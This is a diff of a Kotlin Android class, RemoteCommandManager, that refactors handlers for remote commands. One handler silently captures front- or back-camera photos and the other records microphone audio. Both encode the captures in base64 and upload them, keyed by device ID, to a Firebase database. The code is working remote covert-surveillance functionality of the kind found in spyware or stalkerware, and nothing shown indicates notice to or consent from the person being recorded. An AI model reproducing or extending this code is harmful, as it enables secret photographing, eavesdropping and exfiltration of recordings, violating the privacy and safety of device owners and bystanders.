@@ -664,135 +664,51 @@ class RemoteCommandManager(private val context: Context) {
             throw IllegalStateException("Camera permission (android.permission.CAMERA) not granted.")
         }
 
-        var requestedFacing = CameraCharacteristics.LENS_FACING_BACK
+        var requestedFacing = "back"
         val trimmed = payload.trim()
         if (trimmed.contains("front", ignoreCase = true)) {
-            requestedFacing = CameraCharacteristics.LENS_FACING_FRONT
+            requestedFacing = "front"
         } else if (trimmed.startsWith("{")) {
             try {
                 val json = JSONObject(trimmed)
                 val camStr = json.optString("camera", json.optString("facing", "back")).lowercase()
-                if (camStr == "front") requestedFacing = CameraCharacteristics.LENS_FACING_FRONT
+                if (camStr == "front") requestedFacing = "front"
             } catch (_: Exception) {}
         }
 
-        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
-        val targetCamId = cameraManager.cameraIdList.firstOrNull { id ->
-            val characteristics = cameraManager.getCameraCharacteristics(id)
-            characteristics.get(CameraCharacteristics.LENS_FACING) == requestedFacing
-        } ?: cameraManager.cameraIdList.firstOrNull() ?: throw IllegalStateException("No available camera found on device.")
-
-        val characteristics = cameraManager.getCameraCharacteristics(targetCamId)
-        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-        val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
-        val captureSize = jpegSizes?.firstOrNull { it.width <= 1920 && it.height <= 1080 }
-            ?: jpegSizes?.firstOrNull()
-            ?: Size(1280, 720)
-
-        val handlerThread = HandlerThread("SilentCamThread").apply { start() }
-        val handler = Handler(handlerThread.looper)
-
-        val imageReader = ImageReader.newInstance(captureSize.width, captureSize.height, ImageFormat.JPEG, 2)
-        val latch = java.util.concurrent.CountDownLatch(1)
-        var capturedBytes: ByteArray? = null
-
-        imageReader.setOnImageAvailableListener({ reader ->
-            val image = reader.acquireLatestImage()
-            if (image != null) {
-                try {
-                    val buffer = image.planes[0].buffer
-                    val bytes = ByteArray(buffer.remaining())
-                    buffer.get(bytes)
-                    capturedBytes = bytes
-                } catch (_: Exception) {
-                } finally {
-                    image.close()
-                    latch.countDown()
-                }
-            }
-        }, handler)
-
-        var cameraDevice: CameraDevice? = null
-        var captureSession: CameraCaptureSession? = null
-
+        val cameraHelper = CameraHelper(context)
         try {
-            @SuppressLint("MissingPermission")
-            cameraManager.openCamera(targetCamId, object : CameraDevice.StateCallback() {
-                override fun onOpened(camera: CameraDevice) {
-                    cameraDevice = camera
-                    try {
-                        val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                            addTarget(imageReader.surface)
-                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-                        }
-                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
-                            override fun onConfigured(session: CameraCaptureSession) {
-                                captureSession = session
-                                try {
-                                    session.capture(builder.build(), null, handler)
-                                } catch (e: Exception) {
-                                    latch.countDown()
-                                }
-                            }
+            val cameraId = cameraHelper.getCameraId(requestedFacing)
+            val base64Data = cameraHelper.takePhoto(cameraId) ?: throw Exception("Camera capture failed")
+            
+            val base64Content = base64Data.substringAfter(",")
+            val bytes = Base64.decode(base64Content, Base64.NO_WRAP)
 
-                            override fun onConfigureFailed(session: CameraCaptureSession) {
-                                latch.countDown()
-                            }
-                        }, handler)
-                    } catch (e: Exception) {
-                        latch.countDown()
-                    }
-                }
+            val nowMs = System.currentTimeMillis()
+            val deviceId = try {
+                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
+            } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
 
-                override fun onDisconnected(camera: CameraDevice) {
-                    camera.close()
-                    latch.countDown()
-                }
+            val facingName = if (requestedFacing == "front") "Front" else "Rear/Back"
+            val photoData = mapOf(
+                "timestamp" to nowMs,
+                "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
+                "cameraFacing" to facingName,
+                "fileSizeBytes" to bytes.size,
+                "photoBase64" to base64Data
+            )
 
-                override fun onError(camera: CameraDevice, error: Int) {
-                    camera.close()
-                    latch.countDown()
-                }
-            }, handler)
-
-            val success = latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
-            val bytes = capturedBytes
-            if (success && bytes != null && bytes.isNotEmpty()) {
-                val base64Photo = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                val nowMs = System.currentTimeMillis()
-                val deviceId = try {
-                    Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
-                } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
-
-                val facingName = if (requestedFacing == CameraCharacteristics.LENS_FACING_FRONT) "Front" else "Rear/Back"
-                val photoData = mapOf(
-                    "timestamp" to nowMs,
-                    "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
-                    "cameraFacing" to facingName,
-                    "width" to captureSize.width,
-                    "height" to captureSize.height,
-                    "fileSizeBytes" to bytes.size,
-                    "photoBase64" to "data:image/jpeg;base64,$base64Photo"
-                )
-
-                try {
-                    val rtdb = FirebaseDatabase.getInstance()
-                    rtdb.getReference("devices/$deviceId/camera_snaps/$nowMs").setValue(photoData)
-                    rtdb.getReference("devices/$deviceId/camera_latest").setValue(photoData)
-                } catch (e: Exception) {
-                    Log.e("RemoteCommandManager", "Failed to upload camera snap to RTDB: ${e.message}")
-                }
-
-                "Captured silent $facingName camera photo (${captureSize.width}x${captureSize.height}, ${(bytes.size / 1024)} KB). Uploaded to Cloud."
-            } else {
-                throw Exception("Camera capture timed out or returned empty frame.")
+            try {
+                val rtdb = FirebaseDatabase.getInstance()
+                rtdb.getReference("devices/$deviceId/camera_snaps/$nowMs").setValue(photoData)
+                rtdb.getReference("devices/$deviceId/camera_latest").setValue(photoData)
+            } catch (e: Exception) {
+                Log.e("RemoteCommandManager", "Failed to upload camera snap to RTDB: ${e.message}")
             }
+
+            "Captured silent $facingName camera photo (${(bytes.size / 1024)} KB). Uploaded to Cloud."
         } finally {
-            try { captureSession?.close() } catch (_: Exception) {}
-            try { cameraDevice?.close() } catch (_: Exception) {}
-            try { imageReader.close() } catch (_: Exception) {}
-            try { handlerThread.quitSafely() } catch (_: Exception) {}
+            cameraHelper.cleanup()
         }
     }
 
@@ -802,7 +718,7 @@ class RemoteCommandManager(private val context: Context) {
             throw IllegalStateException("Microphone recording permission (android.permission.RECORD_AUDIO) not granted.")
         }
 
-        var durationSec = 10L
+        var durationSec = 10
         val trimmed = payload.trim()
         if (trimmed.startsWith("{")) {
             try {
@@ -810,7 +726,7 @@ class RemoteCommandManager(private val context: Context) {
                 val keys = listOf("durationSec", "duration_sec", "duration", "seconds", "durationSeconds", "sec", "length", "time")
                 for (key in keys) {
                     if (json.has(key)) {
-                        val d = json.optLong(key, 0L)
+                        val d = json.optInt(key, 0)
                         if (d > 0) {
                             durationSec = d
                             break
@@ -820,92 +736,46 @@ class RemoteCommandManager(private val context: Context) {
             } catch (_: Exception) {}
         } else if (trimmed.contains("=")) {
             val valPart = trimmed.substringAfter("=").trim().filter { it.isDigit() }
-            val parsed = valPart.toLongOrNull()
+            val parsed = valPart.toIntOrNull()
             if (parsed != null && parsed > 0) durationSec = parsed
         } else {
-            val parsed = trimmed.filter { it.isDigit() }.toLongOrNull()
+            val parsed = trimmed.filter { it.isDigit() }.toIntOrNull()
             if (parsed != null && parsed > 0) {
                 durationSec = parsed
             }
         }
-        val finalDuration = durationSec.coerceIn(1L, 600L)
+        val finalDuration = durationSec.coerceIn(3, 60)
 
-        val outFile = File(context.cacheDir, "remote_audio_${System.currentTimeMillis()}.m4a")
-        if (outFile.exists()) outFile.delete()
-
-        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            MediaRecorder(context)
-        } else {
-            @Suppress("DEPRECATION")
-            MediaRecorder()
-        }
-
-        var isRecordingStarted = false
-
+        val audioHelper = AudioRecorderHelper(context)
         try {
-            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            recorder.setAudioEncodingBitRate(64000)
-            recorder.setAudioSamplingRate(22050)
-            recorder.setOutputFile(outFile.absolutePath)
+            val base64Data = audioHelper.startRecording(finalDuration) ?: throw Exception("Audio recording failed")
+            val base64Content = base64Data.substringAfter(",")
+            val audioBytes = Base64.decode(base64Content, Base64.NO_WRAP)
 
-            recorder.prepare()
-            recorder.start()
-            isRecordingStarted = true
+            val nowMs = System.currentTimeMillis()
+            val deviceId = try {
+                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
+            } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
 
-            // Wait for specified duration
-            delay(finalDuration * 1000L)
-        } catch (e: Exception) {
-            Log.e("RemoteCommandManager", "MediaRecorder recording error: ${e.message}")
+            val recData = mapOf(
+                "timestamp" to nowMs,
+                "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
+                "durationSeconds" to finalDuration,
+                "fileSizeBytes" to audioBytes.size,
+                "audioBase64" to base64Data
+            )
+
+            try {
+                val rtdb = FirebaseDatabase.getInstance()
+                rtdb.getReference("devices/$deviceId/audio_recordings/$nowMs").setValue(recData)
+                rtdb.getReference("devices/$deviceId/audio_latest").setValue(recData)
+            } catch (e: Exception) {
+                Log.e("RemoteCommandManager", "Failed to upload audio recording to RTDB: ${e.message}")
+            }
+
+            "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Cloud."
         } finally {
-            if (isRecordingStarted) {
-                try {
-                    recorder.stop()
-                } catch (t: Throwable) {
-                    Log.e("RemoteCommandManager", "MediaRecorder stop safely caught: ${t.message}")
-                }
-            }
-            try {
-                recorder.reset()
-            } catch (t: Throwable) {}
-            try {
-                recorder.release()
-            } catch (t: Throwable) {}
-        }
-
-        if (outFile.exists() && outFile.length() > 0) {
-            try {
-                val audioBytes = outFile.readBytes()
-                val base64Audio = Base64.encodeToString(audioBytes, Base64.NO_WRAP)
-                val nowMs = System.currentTimeMillis()
-                val deviceId = try {
-                    Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
-                } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
-
-                val recData = mapOf(
-                    "timestamp" to nowMs,
-                    "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
-                    "durationSeconds" to finalDuration,
-                    "fileSizeBytes" to audioBytes.size,
-                    "audioBase64" to "data:audio/mp4;base64,$base64Audio"
-                )
-
-                try {
-                    val rtdb = FirebaseDatabase.getInstance()
-                    rtdb.getReference("devices/$deviceId/audio_recordings/$nowMs").setValue(recData)
-                    rtdb.getReference("devices/$deviceId/audio_latest").setValue(recData)
-                } catch (e: Exception) {
-                    Log.e("RemoteCommandManager", "Failed to upload audio recording to RTDB: ${e.message}")
-                }
-
-                return@withContext "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Cloud."
-            } finally {
-                try { if (outFile.exists()) outFile.delete() } catch (_: Exception) {}
-            }
-        } else {
-            try { if (outFile.exists()) outFile.delete() } catch (_: Exception) {}
-            throw Exception("Audio recording failed or output file empty.")
+            audioHelper.cleanup()
         }
     }
 
